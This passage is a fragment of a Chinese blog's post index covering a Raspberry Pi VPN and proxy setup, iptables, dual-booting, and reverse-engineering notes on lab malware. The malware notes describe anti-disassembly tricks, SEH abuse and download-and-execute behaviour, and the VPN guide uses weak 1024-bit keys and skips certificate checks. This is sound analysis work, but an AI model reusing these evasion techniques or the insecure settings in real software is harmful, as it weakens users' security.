​","categories":[{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/categories/%E6%9D%82%E5%AD%A6/"}],"tags":[{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/tags/%E6%9D%82%E5%AD%A6/"}]},{"title":"树莓派搭建vpn服务器","slug":"树莓派搭建vpn服务器","date":"2017-11-10T16:00:00.000Z","updated":"2023-07-27T14:03:58.193Z","comments":true,"path":"2017/11/11/树莓派搭建vpn服务器/","link":"","permalink":"http://zwjsfdbb.top/2017/11/11/%E6%A0%91%E8%8E%93%E6%B4%BE%E6%90%AD%E5%BB%BAvpn%E6%9C%8D%E5%8A%A1%E5%99%A8/","excerpt":"1.此篇是在前篇搭建树莓派透明代理的基础上完成的， 2.树莓派尽量设置成静态ip，具体如下 sudo vim /etc/dhcpcd.conf 填写以下内容 interface eth0 static ip_address=ip static routers=网关 static domain_name_servers=223.5.5.5 3.安装openvpn sudo apt-get install openvpn 4.下载easy-rsa cd /etc/openvpn wget --no-check-certificate https://github.com/OpenVPN/easy-rsa/releases/download/2.2.2/EasyRSA-2.2.2.tgz tar -xzvf EasyRSA-2.2.2.tgz mv EasyRSA-2.2.2 easy-rsa 5.配置easy-rsa cd /etc/openvpn/easy-rsa vim vars # 打开easy-rsa配置文件 修改一下内容 export EASY_RSA=&quot;/etc/openvpn/easy-rsa&quot; export KEY_SIZE=1024 #默认的2048太大，要运算很久 加载配置 source ./vars 6.生成ca密钥","text":"1.此篇是在前篇搭建树莓派透明代理的基础上完成的， 2.树莓派尽量设置成静态ip，具体如下 sudo vim /etc/dhcpcd.conf 填写以下内容 interface eth0 static ip_address=ip static routers=网关 static domain_name_servers=223.5.5.5 3.安装openvpn sudo apt-get install openvpn 4.下载easy-rsa cd /etc/openvpn wget --no-check-certificate https://github.com/OpenVPN/easy-rsa/releases/download/2.2.2/EasyRSA-2.2.2.tgz tar -xzvf EasyRSA-2.2.2.tgz mv EasyRSA-2.2.2 easy-rsa 5.配置easy-rsa cd /etc/openvpn/easy-rsa vim vars # 打开easy-rsa配置文件 修改一下内容 export EASY_RSA=&quot;/etc/openvpn/easy-rsa&quot; export KEY_SIZE=1024 #默认的2048太大，要运算很久 加载配置 source ./vars 6.生成ca密钥 ./clean-all # 先清空所有密钥 ./build-ca # 创建自己的证书 所有内容直接回车就可以了。这时keys文件夹下会多了ca.crt,和ca.key文件 7.生成服务器密钥 ./build-key-server servername # servername为你自己设置的服务器名字 会出现很多让填写的地方，注意下面三个其他的默认就好 Common Name 常用名必须是你方才所设置的服务器名，默认设置如此。 A challenge password? 网上说必须留空，我也照办了，不晓得为什么 Sign the certificate? [y/n] 必须填y 8.生成客户端密钥 ./build-key-pass client1 # 命令中client1是客户端的名字 Enter PEM pass phrase 这个要记住，这是客户端使用vpn时的密码，会让输入两次。 这时keys下又会多出三个文件client1.csr client1.crt client.key 9.生成dh ./build-dh 到此密钥生成部分就完成了。 10.openvpn 服务器配置 # 复制一个模板过来先 cp /usr/share/doc/openvpn/examples/sample-config-files/server.conf /etc/openvpn/server.conf vim /etc/openvpn/server.conf 下面是我的配置 port 1194 #Openvpn服务使用的端口 proto tcp #使用udp协议传输 dev tun #使用隧道 ca /etc/openvpn/easy-rsa/keys/ca.crt #ca公钥路径 cert /etc/openvpn/easy-rsa/keys/server.crt #服务器公钥路径 key /etc/openvpn/easy-rsa/keys/server.key #服务器私钥路径 dh /etc/openvpn/easy-rsa/keys/dh1024.pem #dh server 10.10.20.0 255.255.255.0 #客户端连接后，所在的子网段 ifconfig-pool-persist ipp.txt #客户端使用固定的子网地址，这里可以不配置 push &quot;redirect-gateway def1 bypass-dhcp&quot; #网关重定向，客户端的流量都会经由OpenvpnServer #配置DNS push &quot;dhcp-option DNS 202.141.162.123&quot; push &quot;dhcp-option DNS 202.38.93.153 client-to-client duplicate-cn #允许客户端的CommonName重复，因为我们填的都是默认值 keepalive 10 120 comp-lzo #启动数据压缩 user nobody #Openvpn进程运行时所属的用户，这里为了安全 group nogroup #Openvpn进程运行时所属的组，这里为了安全 persist-key #一直保存key，避免权限问题导致不能再次读取 persist-tun #一直保持隧道，原因同上 status /etc/openvpn/easy-rsa/keys/openvpn-status.log #Openvpn运行状态Log，就在Openvpn目录下，会自动生成 log openvpn.log #Openvpn运行Log，也在Openvpn目录下，会自动生成 verb 3 #log的等级 11.此时可以测试一下了 openvpn server.conf service openvpn restart 不报错就是成功了 12.客户端配置 cp /usr/share/doc/openvpn/examples/sample-config-files/client.conf /etc/openvpn/clientconfig/client.conf vim /etc/openvpn/clientconfig/client.conf 我的配置如下： # 里面注释也很详细，这里贴出我精简后的结果 client #标明是客户端配置 dev tun #使用隧道 proto tcp #使用UDP remote 192.168.19.149 1194 #树莓派外网IP（使用动态域名绑定） + 端口 comp-lzo ca ca.crt #ca公钥 cert wxlnb.crt #客户端公钥 key wxlnb.key #客户端私钥 verb 3 #log等级 13.防火墙规则我就改了一点 iptables -t nat -A PREROUTING -i tun0 -p tcp -j REDSOCKS 14.测试 在其他Windows机器上，下载openvpn 安装，然后把ca.crt,client.conf（就是刚刚那个client.conf）,client1.crt,client1.key复制到config 文件夹下。 参考链接 1.http://www.smartmcu.com/article-246-1.html 2.http://blog.csdn.net/wxlguitar/article/details/51175872","categories":[{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/categories/%E6%9D%82%E5%AD%A6/"}],"tags":[{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/tags/%E6%9D%82%E5%AD%A6/"}]},{"title":"重装系统后hexo 博客恢复","slug":"hexo 博客恢复","date":"2017-11-04T16:00:00.000Z","updated":"2023-07-04T14:16:01.732Z","comments":true,"path":"2017/11/05/hexo 博客恢复/","link":"","permalink":"http://zwjsfdbb.top/2017/11/05/hexo%20%E5%8D%9A%E5%AE%A2%E6%81%A2%E5%A4%8D/","excerpt":"1.安装node.js和git 这个不用多说，直接下载安装就行了。 2.配置 git 个人信息，生成新的 ssh 密钥：git config –global user.name “xxxxxx”git config –global user.email “xxxxxx”ssh-keygen -t rsa -C “xxxxxxxx(邮箱)” 3.添加公钥在用户文件夹.ssh 文件里面把公钥复制出来粘贴到github个人设置的ssh位置。 4.安装hexo建议先npm install cnpm -g –registry&#x3D;https://registry.npm.taobao.org安装的时候 用cpm 代替npm这样的话npm 安装比较快而且不容易失败cnpm install hexo-cli -g 5.删除博客文件夹文件，保留部分打开原来的博客文件夹,只需保留_config.yml，theme&#x2F;，source&#x2F;，scaffolds&#x2F;，package.json，.gitignore 这些项目，删除其他的文件。","text":"1.安装node.js和git 这个不用多说，直接下载安装就行了。 2.配置 git 个人信息，生成新的 ssh 密钥：git config –global user.name “xxxxxx”git config –global user.email “xxxxxx”ssh-keygen -t rsa -C “xxxxxxxx(邮箱)” 3.添加公钥在用户文件夹.ssh 文件里面把公钥复制出来粘贴到github个人设置的ssh位置。 4.安装hexo建议先npm install cnpm -g –registry&#x3D;https://registry.npm.taobao.org安装的时候 用cpm 代替npm这样的话npm 安装比较快而且不容易失败cnpm install hexo-cli -g 5.删除博客文件夹文件，保留部分打开原来的博客文件夹,只需保留_config.yml，theme&#x2F;，source&#x2F;，scaffolds&#x2F;，package.json，.gitignore 这些项目，删除其他的文件。 6.git bush在本文件夹下git bush,运行cnpm install 7.安装部署插件npm install hexo-deployer-git –save 8.测试此时就可以hexo g &amp;&amp; hexo d 测试是否成功了。","categories":[{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/categories/%E6%9D%82%E5%AD%A6/"}],"tags":[{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/tags/%E6%9D%82%E5%AD%A6/"}]},{"title":"对抗反汇编分析","slug":"对抗反汇编分析","date":"2017-10-21T16:00:00.000Z","updated":"2023-07-22T06:40:31.931Z","comments":true,"path":"2017/10/22/对抗反汇编分析/","link":"","permalink":"http://zwjsfdbb.top/2017/10/22/%E5%AF%B9%E6%8A%97%E5%8F%8D%E6%B1%87%E7%BC%96%E5%88%86%E6%9E%90/","excerpt":"一、 样本基本信息 样本来源：恶意代码实战中的Lab15-03.exe。 二、分析过程 IDA 打开发现在00401016处有标红，IDA识别出了一些异常，仔细分析发现，把0x40148c写到了ebp+4的位置，而这个位置刚好是main函数返回地址的位置，通过改写此处的内容让main返回的时候执行0x40148c位置处的代码。 由此可看出主函数应该是非常正常，不会看出有什么恶意的地方。分析0x40148c处的代码。你此处的代码在0x401496处，有明显标红，说明有反汇编异常，一般都是恶意代码作者故意制作的来影响反汇编的结果。此处是一个很明显的对抗反汇编，上一步是跳转到401497的位置，而这个位置是jmp 这条指令的中间，这显然是不可能的，在此处按d键，把代码转为数据显示，然后把401497后面的数据按c键再转回代码，注意对齐。然后把401496位置的数据改为nop,可以通过Edit-&gt;Patch Program-&gt;change word ,把E9改为90，然后按c转换为代码就可以了。效果如图 继续往下看，发现有一个除零异常出现 ， 显然恶意代码先把异常处理函数的地址存到FS寄存器，然后出发除零异常执行此处的函数。显此处显然异常处理函数的地址是0x4014c0，而0x4014c0位置处的IDA没有识别为代码。按c键来转换为代码，继续向下看，在0x4014D7位置处，又出现了一个与0x401496处的相似的异常，同样的方法进行处理，结果如图","text":"一、 样本基本信息 样本来源：恶意代码实战中的Lab15-03.exe。 二、分析过程 IDA 打开发现在00401016处有标红，IDA识别出了一些异常，仔细分析发现，把0x40148c写到了ebp+4的位置，而这个位置刚好是main函数返回地址的位置，通过改写此处的内容让main返回的时候执行0x40148c位置处的代码。 由此可看出主函数应该是非常正常，不会看出有什么恶意的地方。分析0x40148c处的代码。你此处的代码在0x401496处，有明显标红，说明有反汇编异常，一般都是恶意代码作者故意制作的来影响反汇编的结果。此处是一个很明显的对抗反汇编，上一步是跳转到401497的位置，而这个位置是jmp 这条指令的中间，这显然是不可能的，在此处按d键，把代码转为数据显示，然后把401497后面的数据按c键再转回代码，注意对齐。然后把401496位置的数据改为nop,可以通过Edit-&gt;Patch Program-&gt;change word ,把E9改为90，然后按c转换为代码就可以了。效果如图 继续往下看，发现有一个除零异常出现 ， 显然恶意代码先把异常处理函数的地址存到FS寄存器，然后出发除零异常执行此处的函数。显此处显然异常处理函数的地址是0x4014c0，而0x4014c0位置处的IDA没有识别为代码。按c键来转换为代码，继续向下看，在0x4014D7位置处，又出现了一个与0x401496处的相似的异常，同样的方法进行处理，结果如图 这个估计就是恶意代码真正要做的事情的代码了。继续向下看，有个URLDownloadToFileA函数，显然很恶意。下面还有个反汇编异常先处理了，先D后C，然后结果如下， 到此整个代码就分析完了，主要是4014c0处是真正要关注的，下面分析这个位置的代码 主要关注标红的位置，此处看不出什么来，在OD中实际执行一下来看。 直接在0x40148c处下断点，然后直接f9运行到此处，若看到一堆数据，右键分析-&gt;从模块中删除分析就可以了，改写相应位置的异常按照IDA那样，实验过程发现se处理程序的确是0x4014c0但是程序并没有跳到那个位置而是终止了，没搞明白，为了真正看到0x4014c0处的具体执行情况。我选择直接编辑汇编代码。写入jmp 0x4014c0, 发现在0x4014db处好像也是异常终止了，后改为 正常了、然后在四个函数处下断点观察参数信息和返回信息， 0x401534明显是一个解密函数，然后把网址和文件就解密出来，然后URLDownloadToFileA下载，winexec 执行下载的文件。","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"iptables","slug":"iptables","date":"2017-10-19T16:00:00.000Z","updated":"2023-07-27T14:35:21.083Z","comments":true,"path":"2017/10/20/iptables/","link":"","permalink":"http://zwjsfdbb.top/2017/10/20/iptables/","excerpt":"简介&amp;emsp;&amp;emsp;当主机收到一个数据包后，数据包先在内核空间中处理，若发现目的地址是自身，则传到用户空间中交给对应的应用程序处理，若发现目的不是自身，则会将包丢弃或进行转发。 &amp;emsp;&amp;emsp;iptables实现防火墙功能的原理是：在数据包经过内核的过程中有五处关键地方，分别是PREROUTING、INPUT、OUTPUT、FORWARD、POSTROUTING，称为钩子函数，iptables这款用户空间的软件可以在这5处地方写规则，对经过的数据包进行处理，规则一般的定义为“如果数据包头符合这样的条件，就这样处理数据包”。 &amp;emsp;&amp;emsp;iptables中定义有表，分别表示提供的功能，有filter表（实现包过滤）、nat表（实现网络地址转换）、mangle表（实现包修改）、raw表（实现数据跟踪），这些表具有一定的优先级：raw–&gt;mangle–&gt;nat–&gt;filter 常用操作&amp;emsp常用操作命令 说明 -A 在指定链尾部添加规则 -D 删除匹配的规则","text":"简介&amp;emsp;&amp;emsp;当主机收到一个数据包后，数据包先在内核空间中处理，若发现目的地址是自身，则传到用户空间中交给对应的应用程序处理，若发现目的不是自身，则会将包丢弃或进行转发。 &amp;emsp;&amp;emsp;iptables实现防火墙功能的原理是：在数据包经过内核的过程中有五处关键地方，分别是PREROUTING、INPUT、OUTPUT、FORWARD、POSTROUTING，称为钩子函数，iptables这款用户空间的软件可以在这5处地方写规则，对经过的数据包进行处理，规则一般的定义为“如果数据包头符合这样的条件，就这样处理数据包”。 &amp;emsp;&amp;emsp;iptables中定义有表，分别表示提供的功能，有filter表（实现包过滤）、nat表（实现网络地址转换）、mangle表（实现包修改）、raw表（实现数据跟踪），这些表具有一定的优先级：raw–&gt;mangle–&gt;nat–&gt;filter 常用操作&amp;emsp常用操作命令 说明 -A 在指定链尾部添加规则 -D 删除匹配的规则 -R 替换匹配的规则 -I 在指定位置插入规则 例：iptables -I INPUT 1 --dport 80 -j ACCEPT （将规则插入到filter表INPUT链中的第一位上） -L&#x2F;S 列出指定链或所有链的规则 -F 删除指定链或所有链的规则 -N 创建用户自定义链 例：iptables -N allowed -X 删除指定的用户自定义链 -P 为指定链设置默认规则策略，对自定义链不起作用 例：iptables -P OUTPUT DROP -Z 将指定链或所有链的计数器清零 -E 更改自定义链的名称 例：iptables -E allowed disallowed -n ip地址和端口号以数字方式显示 例：iptables -Ln 常见规则匹配器 说明 -p tcp|udp|icmp|all 匹配协议，all会匹配所有协议 -s addr[&#x2F;mask] 匹配源地址 -d addr[&#x2F;mask] 匹配目标地址 –sport port1[:port2] 匹配源端口(可指定连续的端口） –dport port1[:port2] 匹配目的端口(可指定连续的端口） -o interface 匹配出口网卡，只适用FORWARD、POSTROUTING、OUTPUT。 例：iptables -A FORWARD -o eth0 -i interface 匹配入口网卡，只使用PREROUTING、INPUT、FORWARD。 –icmp-type 匹配icmp类型（使用iptables -p icmp -h可查看可用的ICMP类型） –tcp-flags mask comp 匹配TCP标记，mask表示检查范围，comp表示匹配mask中的哪些标记。 例：iptables -A FORWARD -p tcp --tcp-flags ALL SYN，ACK -j ACCEPT （表示匹配SYN和ACK标记的数据包） 目标动作 说明 ACCEPT 允许数据包通过 DROP 丢弃数据包 REJECT 丢弃数据包，并且将拒绝信息发送给发送方 SNAT 源地址转换（在nat表上） 例：iptables -t nat -A POSTROUTING -d 192.168.0.102 -j SNAT --to 192.168.0.1 DNAT 目标地址转换（在nat表上） 例：iptables -t nat -A PREROUTING -d 202.202.202.2 -j DNAT --to-destination 192.168.0.102 REDIRECT 目标端口转换（在nat表上） 例：iptables -t nat -D PREROUTING -p tcp --dport 8080 -i eth2.2 -j REDIRECT --to 80 MARK 将数据包打上标记 例：iptables -t mangle -A PREROUTING -s 192.168.1.3 -j MARK --set-mark 60 注意要点： 1、目标地址转换一般在PREROUTING链上操作 2、源地址转换一般在POSTROUTING链上操作 state：匹配指定的状态数据包 参数 说明 –state value value可以为NEW、RELATED（有关联的）、ESTABLISHED、INVALID（未知连接） 例子： iptables -A INPUT -m state –state NEW，ESTABLISHED -j ACCEPT 常见iptables&amp;emsp;&amp;emsp;MASQUERADE：是动态分配ip时用的IP伪装：在nat表的POSTROUTING链加入一条规则:所有从ppp0口送出的包会被伪装（MASQUERADE） iptables -t nat -A POSTROUTING -o ppp0 -j MASQUERADE &amp;emsp;&amp;emsp;REDIRECT：重定向，这个在squid透明代理时肯定要用到它 所有从eth1进入的请求80和82端口的数据，被转发到80端口，由squid处理。 iptables -t nat -A PREROUTING - -i eth1 -p tcp -m multiport –dports 80,82 -j REDIRECT –to-ports 80 保存和恢复iptables规则 使用iptables-save可以保存到特定文件中 &amp;emsp;&amp;emsp;iptables-save &gt;&#x2F;etc&#x2F;sysconfig&#x2F;iptables_save 使用iptables-restore可以恢复规则 &amp;emsp;&amp;emsp;iptables-restore&lt;&#x2F;etc&#x2F;sysconfig&#x2F;iptables_save","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"双系统安装（win10+ubuntu）","slug":"双系统安装","date":"2017-10-15T16:00:00.000Z","updated":"2017-10-25T07:36:25.325Z","comments":true,"path":"2017/10/16/双系统安装/","link":"","permalink":"http://zwjsfdbb.top/2017/10/16/%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/","excerpt":"1.我选择的 是win10加ubuntu双系统。 2.准备工作 U盘一个16g win10系统 ubuntu系统 3.备份好硬盘数据以后，空出一个分区，然后制作一个PE盘，然后进PE删除这个分区，使其处于未分配的空间状态，用于安装ubuntu ,然后安装win10，这个就不用多说了，大家都会。 4.安装结束以后，用大白菜iso装机方式，把ubuntu系统直接写入U盘，然后U盘其启动即可进入装机状态。 其他的跟一般装ubuntu一样，在分区那个位置，选择其他方式，选择手动分区，然后选择刚刚那个未分配空间，一般可以分4个分区。&#x2F;boot 200M,swap分区视内存定,一般可以和内存一样大，然后剩下分&#x2F;，15g-20g左右，剩下的可以全部给&#x2F;home。引导驱动器选择&#x2F;boot,然后继续安装正常方式来装就好了。 4.此时两个系统都安好了，但是此时还是默认win10启动，此时最重要的来了，下载一个叫EasyBCD的软件，选择添加新条目，然后选择Linux，然后名称，驱动器选择&#x2F;boot对应的就好了。此时重启你就会发现有两个候选操作系统了。","text":"1.我选择的 是win10加ubuntu双系统。 2.准备工作 U盘一个16g win10系统 ubuntu系统 3.备份好硬盘数据以后，空出一个分区，然后制作一个PE盘，然后进PE删除这个分区，使其处于未分配的空间状态，用于安装ubuntu ,然后安装win10，这个就不用多说了，大家都会。 4.安装结束以后，用大白菜iso装机方式，把ubuntu系统直接写入U盘，然后U盘其启动即可进入装机状态。 其他的跟一般装ubuntu一样，在分区那个位置，选择其他方式，选择手动分区，然后选择刚刚那个未分配空间，一般可以分4个分区。&#x2F;boot 200M,swap分区视内存定,一般可以和内存一样大，然后剩下分&#x2F;，15g-20g左右，剩下的可以全部给&#x2F;home。引导驱动器选择&#x2F;boot,然后继续安装正常方式来装就好了。 4.此时两个系统都安好了，但是此时还是默认win10启动，此时最重要的来了，下载一个叫EasyBCD的软件，选择添加新条目，然后选择Linux，然后名称，驱动器选择&#x2F;boot对应的就好了。此时重启你就会发现有两个候选操作系统了。","categories":[{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/categories/%E6%9D%82%E5%AD%A6/"}],"tags":[{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/tags/%E6%9D%82%E5%AD%A6/"}]},{"title":"对抗反汇编","slug":"对抗反汇编","date":"2017-10-15T16:00:00.000Z","updated":"2023-07-22T06:40:55.884Z","comments":true,"path":"2017/10/16/对抗反汇编/","link":"","permalink":"http://zwjsfdbb.top/2017/10/16/%E5%AF%B9%E6%8A%97%E5%8F%8D%E6%B1%87%E7%BC%96/","excerpt":"方法总结如下：1、插入流氓字节，阻止真正的指令被反汇编线性反汇编和面向代码流的反汇编： 线性反汇编是遍历一个代码段，一次一条指令的线性反汇编，不考虑代码流的控制指令。而面向代码流的反汇编是会检查每一条指令。然后建立反汇编的地址列表，然后这样的反汇编算法会更加先进，而不易出错。比如： .text:00401035 jz short near ptr loc_401037+1 .text:00401037 .text:00401037 loc_401037: ; CODE XREF: .text:00401035\u0018j .text:00401037 call near ptr 8B4C55C7h 观察以上的汇编代码，你会发现jz跳转到了call 指令中间，这显然是不可能的，所以call指令一定是一个数据而不是代码，在此处按d键，然后再观察 .text:00401035 jz short loc_401038 .text:00401035 ; ————————————————————————— .text:00401037 db 0E8h .text:00401038 ; ————————————————————————— .text:00401038 .text:00401038 loc_401038: ; CODE XREF: .text:00401035\u0018j .text:00401038 mov eax, [ebp+0Ch] 这样显然很正确了，对于call 指令而言，如果后面四个字节跟的是地址，它对应的机器码是0xe8，此处显然是把数据0xe8当成了call指令，才会出现这样的问题。 2、固定条件的跳转指令 xor eax, eax .text:00401035 jz short loc_401038","text":"方法总结如下：1、插入流氓字节，阻止真正的指令被反汇编线性反汇编和面向代码流的反汇编： 线性反汇编是遍历一个代码段，一次一条指令的线性反汇编，不考虑代码流的控制指令。而面向代码流的反汇编是会检查每一条指令。然后建立反汇编的地址列表，然后这样的反汇编算法会更加先进，而不易出错。比如： .text:00401035 jz short near ptr loc_401037+1 .text:00401037 .text:00401037 loc_401037: ; CODE XREF: .text:00401035\u0018j .text:00401037 call near ptr 8B4C55C7h 观察以上的汇编代码，你会发现jz跳转到了call 指令中间，这显然是不可能的，所以call指令一定是一个数据而不是代码，在此处按d键，然后再观察 .text:00401035 jz short loc_401038 .text:00401035 ; ————————————————————————— .text:00401037 db 0E8h .text:00401038 ; ————————————————————————— .text:00401038 .text:00401038 loc_401038: ; CODE XREF: .text:00401035\u0018j .text:00401038 mov eax, [ebp+0Ch] 这样显然很正确了，对于call 指令而言，如果后面四个字节跟的是地址，它对应的机器码是0xe8，此处显然是把数据0xe8当成了call指令，才会出现这样的问题。 2、固定条件的跳转指令 xor eax, eax .text:00401035 jz short loc_401038 3、函数指针问题 mov [ebp+var_4],offset sub_4011c0; call [ebp+var_4] 可用IDA脚本语言IDC进行修正函数为AddCodeXref(); 4、函数未识别的问题可以按p键来强制把一段代码变成函数但是要把流氓字节nop,不然函数可能会出问题。用IDA自带的patch program来做。也可用脚本idapython 代码如下： import idaapi idaapi.CompileLine(&#39;static n_key()&#123; RunPythonStatement(&quot;nopIt()&quot;);&#125;&#39;) AddHotkey(&quot;Alt-N&quot;,&quot;n_key&quot;) def nopIt(): start=ScreenEA() end=NextHead(start) for ea in range(start,end): PatchByte(ea,0x90) Jump(end) 5、异常触发 push offset sub_4014c0 push large dword ptr fs:0 mov large fs:0,esp xor ecx,ecx div ecx 属于滥用结构化异常（SEH）来对抗反汇编，通过人为构造一些比如访问一个无效的内存区域，除0等来触发异常， SHE链是一个函数列表，处理线程的异常，列表中的函数要么处理异常，要么向下传递，如果传递到最后一个异常处理函数，就会被认为是一个不能处理的异常，弹出“an unhandled exception has occurred ”。 查找SEH链，操作系统会检查FS寄存器，这个寄存器中包含一个段选择子，从概念上来讲，链表以栈的方式工作，第一个调用的是最后一个加入链表的记录。前面的例子就是把自己的异常处理加入到链表的头部，然后用除0来触发异常，进而执行自己的代码。","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"恶意代码重定向","slug":"恶意代码重定向","date":"2017-10-15T16:00:00.000Z","updated":"2023-07-27T13:55:16.115Z","comments":true,"path":"2017/10/16/恶意代码重定向/","link":"","permalink":"http://zwjsfdbb.top/2017/10/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%87%8D%E5%AE%9A%E5%90%91/","excerpt":"&amp;emsp;1.首先用strings查看字符串，发现http://www.practicalmalwareanalysis.com/start.htm，User-Agent字样，以及C:\\autobat.exe，疑似编码用的字符串： /abcdefghijklmnopqrstuvwxyz0123456789:.以及CreateFile，CreateProcessA， InternetReadFile InternetCloseHandle InternetOpenUrlA InternetOpenA WININET.dll URLDownloadToCacheFileA &amp;emsp;&amp;emsp;显式调用高层API COM接口，以及Wininet 接口函数。这些函数，这些都是重要信息需要关注的。 &amp;emsp;&amp;emsp;2.IDA加载程序分析，首先是401457函数，调用了CreateFileA和ReadFile函数，具体分析发现是打开’C:\\autobat.exe’,失败了调用函数，分析可知是把’http://www.practicalmalwareanalysis.com/start.htm&#39;,0写入文件C:\\autobat.exe，重命名该函数为write_url,然后再次调用401457函数，分析可得是把该网址读到缓冲区ipbuffer,命名该函数为read_url,返回值为1，然后接下来调用4011f3函数，首先是在szagent地址存放硬编码的头部信息，但是错误的多写了User-Agent：这样会导致实际得到的头部会出现User-Agent:User-Agent:的情况。然后下面是InternetOpenA和InternetOpenUrlA函数打开http://www.practicalmalwareanalysis.com/start.htm，打开成功后InternetReadFile读取页面信息， 首先搜索&lt;no’字符串，然后调用401000函数， &amp;emsp;&amp;emsp;进去分析发现是对&lt;noscript标签的不规则比较，然后对判断是否后面会有http://www.practicalmalwareanalysis.com，然后找到“96”的位置结束，然后把v7地址存放的内容赋到a3地址。 &amp;emsp;&amp;emsp;函数401000成功返回1，然后4011f3也返回1，最后执行401684函数，函数有两个参数，一个是刚刚的a3，另一个是v6的地址。v6&#x3D;1,打开401684函数进行分析，是现实strtok函数，把字符串分为两部分，分别赋给两变量，然后是个case语句，当发现首字母为d时，执行401565函数，分析401565函数，首先是401147函数初步分析发现是个解码函数，然后后面是URLDownloadToCacheFileA，CreateProcessA函数，是把下载的程序运行起来。首字母为n时，v6置1，首字母为s时，sleep特定的时间，首字母为r时，运行401651函数，进去函数进行分析，发现又是刚刚那个解码函数401147，然后再次调用write_url函数，由此可以知道应该是个url重定向。到此整个样本就已经分析结束了。","text":"&amp;emsp;1.首先用strings查看字符串，发现http://www.practicalmalwareanalysis.com/start.htm，User-Agent字样，以及C:\\autobat.exe，疑似编码用的字符串： /abcdefghijklmnopqrstuvwxyz0123456789:.以及CreateFile，CreateProcessA， InternetReadFile InternetCloseHandle InternetOpenUrlA InternetOpenA WININET.dll URLDownloadToCacheFileA &amp;emsp;&amp;emsp;显式调用高层API COM接口，以及Wininet 接口函数。这些函数，这些都是重要信息需要关注的。 &amp;emsp;&amp;emsp;2.IDA加载程序分析，首先是401457函数，调用了CreateFileA和ReadFile函数，具体分析发现是打开’C:\\autobat.exe’,失败了调用函数，分析可知是把’http://www.practicalmalwareanalysis.com/start.htm&#39;,0写入文件C:\\autobat.exe，重命名该函数为write_url,然后再次调用401457函数，分析可得是把该网址读到缓冲区ipbuffer,命名该函数为read_url,返回值为1，然后接下来调用4011f3函数，首先是在szagent地址存放硬编码的头部信息，但是错误的多写了User-Agent：这样会导致实际得到的头部会出现User-Agent:User-Agent:的情况。然后下面是InternetOpenA和InternetOpenUrlA函数打开http://www.practicalmalwareanalysis.com/start.htm，打开成功后InternetReadFile读取页面信息， 首先搜索&lt;no’字符串，然后调用401000函数， &amp;emsp;&amp;emsp;进去分析发现是对&lt;noscript标签的不规则比较，然后对判断是否后面会有http://www.practicalmalwareanalysis.com，然后找到“96”的位置结束，然后把v7地址存放的内容赋到a3地址。 &amp;emsp;&amp;emsp;函数401000成功返回1，然后4011f3也返回1，最后执行401684函数，函数有两个参数，一个是刚刚的a3，另一个是v6的地址。v6&#x3D;1,打开401684函数进行分析，是现实strtok函数，把字符串分为两部分，分别赋给两变量，然后是个case语句，当发现首字母为d时，执行401565函数，分析401565函数，首先是401147函数初步分析发现是个解码函数，然后后面是URLDownloadToCacheFileA，CreateProcessA函数，是把下载的程序运行起来。首字母为n时，v6置1，首字母为s时，sleep特定的时间，首字母为r时，运行401651函数，进去函数进行分析，发现又是刚刚那个解码函数401147，然后再次调用write_url函数，由此可以知道应该是个url重定向。到此整个样本就已经分析结束了。","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"树莓派透明代理","slug":"树莓派透明代理","date":"2017-10-15T16:00:00.000Z","updated":"2017-10-25T11:46:28.328Z","comments":true,"path":"2017/10/16/树莓派透明代理/","link":"","permalink":"http://zwjsfdbb.top/2017/10/16/%E6%A0%91%E8%8E%93%E6%B4%BE%E9%80%8F%E6%98%8E%E4%BB%A3%E7%90%86/","excerpt":"1.安装vim 连网之后，首先安装vim,便于后面的配置文件的编写。 sudo apt-get install vim 2.静态ip 图形界面貌似会失败，建议在配置文件里改： sudo vim /etc/dhcpcd.conf 填写以下内容 interface eth0 static ip_address=ip static routers=网关 static domain_name_servers=223.5.5.5 3.配置路由转发： sudo vim /etc/sysctl.conf","text":"1.安装vim 连网之后，首先安装vim,便于后面的配置文件的编写。 sudo apt-get install vim 2.静态ip 图形界面貌似会失败，建议在配置文件里改： sudo vim /etc/dhcpcd.conf 填写以下内容 interface eth0 static ip_address=ip static routers=网关 static domain_name_servers=223.5.5.5 3.配置路由转发： sudo vim /etc/sysctl.conf 设置： net.ipv4.ip_forward=1 4.ssh开机自启动 &amp;emsp;&amp;emsp;ssh 连接树莓派还是很放方面的，不用每次都去接键盘之类的但是树莓派的ssh 默认是不自启动的，在&#x2F;etc&#x2F;rc.local中添加 sudo /etc/init.d/ssh start (exit 之前) 5.shadowssocks 安装 建议pip 安装 sudo pip install shadowsocks就可以了然后就是配置文件的编写 sudo mkdir &#x2F;etc&#x2F;shadowsockssudo touch &#x2F;etc&#x2F;shadowsocks&#x2F;shadowsocks.json 添加以下内容 &#123; &quot;server&quot;:&quot;127.0.0.1&quot;, &quot;server_port&quot;:ss服务器端口, &quot;local_address&quot;:&quot;0.0.0.0&quot;, &quot;local_port&quot;:1080, 